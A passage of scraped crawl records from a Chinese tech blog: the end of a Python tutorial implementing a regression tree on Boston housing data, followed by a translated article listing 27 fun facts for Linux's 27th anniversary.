class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef _predict(self, row):\r\n    nd = self.root\r\n    while nd.left and nd.right:\r\n        if row[nd.feature] &lt; nd.split:\r\n            nd = nd.left\r\n        else:\r\n            nd = nd.right\r\n    return nd.score</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc9829084430-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc9829084430-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc9829084430-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc9829084430-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc9829084430-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc9829084430-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dc9829084430-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dc9829084430-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc9829084430-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">_predict</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">row</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc9829084430-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">nd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">root</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc9829084430-3\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">while</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">left </span><span class=\"crayon-st\">and</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">right</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc9829084430-4\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">row</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">feature</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">split</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc9829084430-5\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">nd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">left</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc9829084430-6\"><span class=\"crayon-e\">        </span><span class=\"crayon-st\">else</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dc9829084430-7\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">nd</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">right</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dc9829084430-8\"><span class=\"crayon-e\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nd</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">score</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0017 seconds] -->\r\n<p></p>\n<h2>2.11 预测多个样本</h2>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2dcd374163420\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ndef predict(self, X):\r\n    return [self._predict(Xi) for Xi in X]</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dcd374163420-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dcd374163420-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2dcd374163420-1\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">predict</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dcd374163420-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-r\">self</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">_predict</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">Xi</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Xi </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">]</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0197 seconds] -->\r\n<p></p>\n<h2>3 效果评估</h2>\n<h2>3.1 main函数</h2>\n<p>使用著名的波士顿房价数据集，按照7:3的比例拆分为训练集和测试集，训练模型，并统计准确度。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6710c2dd0202595241\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n@run_time\r\ndef main():\r\n    print(\"Tesing the accuracy of RegressionTree...\")\r\n    # Load data\r\n    X, y = load_boston_house_prices()\r\n    # Split data randomly, train set rate 70%\r\n    X_train, X_test, y_train, y_test = train_test_split(\r\n        X, y, random_state=10)\r\n    # Train model\r\n    reg = RegressionTree()\r\n    reg.fit(X=X_train, y=y_train, max_depth=4)\r\n    # Show rules\r\n    reg.print_rules()\r\n    # Model accuracy\r\n    get_r2(reg, X_test, y_test)</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dd0202595241-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dd0202595241-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dd0202595241-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dd0202595241-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dd0202595241-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dd0202595241-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dd0202595241-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dd0202595241-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dd0202595241-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dd0202595241-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dd0202595241-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dd0202595241-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dd0202595241-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6710c2dd0202595241-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5bab6710c2dd0202595241-15\">15</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6710c2dd0202595241-1\"><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">run_time</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dd0202595241-2\"><span class=\"crayon-e\">def </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dd0202595241-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"Tesing the accuracy of RegressionTree...\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dd0202595241-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># Load data</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dd0202595241-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">load_boston_house_prices</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dd0202595241-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># Split data randomly, train set rate 70%</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dd0202595241-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">X_train</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X_test</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_train</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">train_test_split</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dd0202595241-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">random_state</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dd0202595241-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># Train model</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dd0202595241-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">reg</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">RegressionTree</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dd0202595241-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">reg</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">fit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">X</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">X_train</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">y_train</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">max_depth</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dd0202595241-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># Show rules</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dd0202595241-13\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">reg</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">print_rules</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6710c2dd0202595241-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-p\"># Model accuracy</span></div><div class=\"crayon-line\" id=\"crayon-5bab6710c2dd0202595241-15\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">get_r2</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">reg</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X_test</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_test</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0166 seconds] -->\r\n<p></p>\n<h2>3.2 效果展示</h2>\n<p>最终生成了15条规则，拟合优度0.801，运行时间1.74秒，效果还算不错~</p>\n<p><img class=\"alignnone size-full wp-image-114266\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/ec2505e9bb1a66c58473212feef54d1f.jpg\" alt=\"v2-f18bda130e08931020827c562c57f22e_hd\"></p>\n<h2>3.3 工具函数</h2>\n<p>本人自定义了一些工具函数，可以在github上查看 <a href=\"https://github.com/tushushu/Imylu/blob/master/utils.py\" target=\"_blank\">https://<span class=\"visible\">github.com/tushushu/Imy</span><span class=\"invisible\">lu/blob/master/utils.py</span></a> 1. run_time – 测试函数运行时间 2. load_boston_house_prices – 加载波士顿房价数据 3. train_test_split – 拆分训练集、测试机 4. get_r2 – 计算拟合优度</p>\n<h2>总结</h2>\n<p>回归树的原理：</p>\n<blockquote><p>损失最小化，平均值大法。 最佳行与列，效果顶呱呱。</p></blockquote>\n<p>回归树的实现：</p>\n<blockquote><p>一顿操作猛如虎，加减乘除二叉树。</p></blockquote>\n<p> </p>\n<p>原文：https://zhuanlan.zhihu.com/p/41688007</p>\n<p>【关于作者】</p>\n<p>李小文：先后从事过数据分析、数据挖掘工作，主要开发语言是Python，现任一家小型互联网公司的算法工程师。Github: <a href=\"https://github.com/tushushu\" target=\"_blank\" rel=\"noopener\">https://gith<wbr></wbr>ub.com/tushu<wbr></wbr>shu</a></p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114261\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114261votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114261\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/jobbole\">伯乐在线读者</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/jobbole\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            ① 本账号用于发布那些在伯乐在线无账号的读者的投稿，包括译文和原创文章。② 欢迎加入伯乐在线专栏作者：http://blog.jobbole.com/99322/        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/jobbole\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/jobbole/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/jobbole/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 34</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/eadb28355fab57e9672e5c965147ef4caca04ac4.jpg"}
{"title": "Linux 27 周年，这 27 件相关的有趣事实你可能不知道", "url": "http://blog.jobbole.com/114321/", "create_date": "2018/08/26", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/07da294f28a2b2db5b251dfd6a548197.jpg"], "url_object_id": "154e49cca2ec14329c1c068f3885b6b2", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.omgubuntu.co.uk/2018/08/interesting-facts-about-linux\">OMG Ubuntu</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/news/99331/27-interesting-facts-about-linux\">开源中国</a>   </div><p>许多人认为10月5日是 Linux 系统的周年纪念日，因为这是 Linux 在1991年首次对外公布的时间。不过，你可能不知道的是，早在1991年8月25日，当年还是大学生的 Linus Torvalds 就向 comp.os.minix 新闻组的人透露了由于“业余爱好”他正在研究操作系统的消息。因此，该时间也被许多爱好者视为 Linux 的真正诞生日期。</p>\n<p>为纪念 Linux 27 岁诞辰，<a href=\"https://www.omgubuntu.co.uk/2018/08/interesting-facts-about-linux\" target=\"_blank\">OMG Ubuntu</a> 列出了 27 个与 Linux 和 Linus Torvalds 相关的有趣事实。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/08/07da294f28a2b2db5b251dfd6a548197.jpg\" alt=\"\"></p>\n<p>1、截至 2018 年，Linux 内核已有 20,323,379 行代码。尽管近期有所减少，但庞大的代码量意味着 Linux 仍然是地球上（单个）最大的开源项目。</p>\n<p>2、Linux 差点不叫这个名字！Linus Torvalds 原本想把他的“业余爱好”项目称为“FreaX”（“ Free”和“Unix”的组合）。值得庆幸的是，他早期使用的代码托管服务器的所有者说服了他，最终取名为 “Linux”（“Linus”和“Unix”的组合）。</p>\n<p>3、首个 Linux 版本 100％ 由 Linus Torvalds 编写，但最新的版本仅包含不到 1％ 的 Linus 编写的代码。他并不懈怠，现在主要是忙于管理和合并其他开发者编写的代码。</p>\n<p>4、Linux 被世界上所有主要的太空计划使用，包括 NASA 和 ESA 。</p>\n<p>5、谈及更广阔的宇宙，有以 Linux 和 Linus Torvalds 命名的小行星。</p>\n<p>6、Linux 的吉祥物 Tux 之所以是一只企鹅，据 Linus 回忆是因为他曾经被一只愤怒的企鹅咬伤。</p>\n<p>7、Linux 完全统治超级计算机。截至2018年，世界上最快的 500 个超级计算机 100％ 运行 Linux 。</p>\n<p>8、Linux 开发社区非常活跃。据统计，在过去 15 个月里，Linux Kernel 以平均每小时 7.8 个补丁的速度被合并。</p>\n<p>9、 Linux 早期以 MINIX 操作系统为原型，导致 Linus 采用类似于 Minix 的文件系统布局来实现他的新兴项目。之后由于被证明效率低下，Linus 采用“扩展文件系统”（ext）取代它，至今仍在使用。</p>\n<p>10、Linux 1.0 于1994年3月14日发布，共包含 176,250 行代码。2.0 版本紧随其后，于1996年发布。</p>\n<p>11、Linux 正运行在从智能手机到服务器，再到潜艇和太空火箭等大量事物上。</p>\n<p>12、乔布斯曾在2000年为 Linus Torvalds 提供一份工作，条件是他停止在 Linux 上的开发。Linus 拒绝了。</p>\n<p>13、Linux 有多成功？它的长期竞争对手微软，在90年代初曾试图“熄灭”该项目，到现在却在利用 Linux 进行服务器业务，甚至在为内核开发做贡献！</p>\n<p>14、说到贡献，谷歌、英特尔、华为、三星、红帽、Canonical 和 Facebook 是近年来 Linux 内核开发的主要贡献者。</p>\n<p>15、Linus 出生于芬兰，一个双语国家，并认为瑞典语是他的“母语”。他说，由于发音不同，他常常觉得用英语说话“不舒服”，但却更喜欢阅读英文书籍。</p>\n<p>16、Linux 可能是现在最大的自由软件项目（参见第一条），不过在1991年首次发布时，它仅有约 10 万行代码。</p>\n<p>17、在重新调整其开发和发布时间表后，新版本的 Linux kernel 现在基本每隔 66 天左右发布一次。</p>\n<p>18、Linux 不是 Linus Trovalds 唯一知名的作品，还有 Git 版本控制系统和潜水应用 Subsurface 。</p>\n<p>19、据估计，90％ 的好莱坞视觉效果在生产流程的某个阶段依赖于 Linux 。</p>\n<p>20、根据 openhub.net 的统计数据，超过 95％ 的 Linux 是用 C 语言编写的。</p>\n<p>21、最新版本的 Linux kernel 可能有 13.3％的代码由空行组成。这并非毫无意义，空行是严谨的编码风格的一部分，使内核保持整洁、高效和有序。</p>\n<p>22、基于 Linux 的 Android 是目前全球最成功的移动操作系统。</p>\n<p>23、Linux 的每个内核版本都有一个有趣的代号，比如 v4.13 的 “Fearless Coyote” (v4.13) 和 v4.18 的 “Merciless Moray” 。</p>\n<p>24、据红帽所述，排名前十的公有云中有 9 个是运行在 Linux 上的。</p>\n<p>25、Ubuntu 是世界上最流行的基于 Linux 的桌面操作系统，它在全球拥有约 2000 万用户。Linux 占台式计算机约 2％ 的使用份额。</p>\n<p>26、第一本关于 Linux 的出版物是 Matt Welsh 于1993年出版的 “Linux 安装和入门” 。第一本专刊 “Linux Journal” 于1994年3月出版，并首次对 Linus 进行了采访。</p>\n<p>27、Linux 是开源领域最着名的模范，但其实早期版本的 Linux 是禁止商业使用或再分发的。直到1992年发布 0.12 版本，Linus 才采用 GPL 协议。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114321\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114321votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114321\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/8d90d339ad3f964cdd84201e17fd7d46aecb20bf.jpg"}
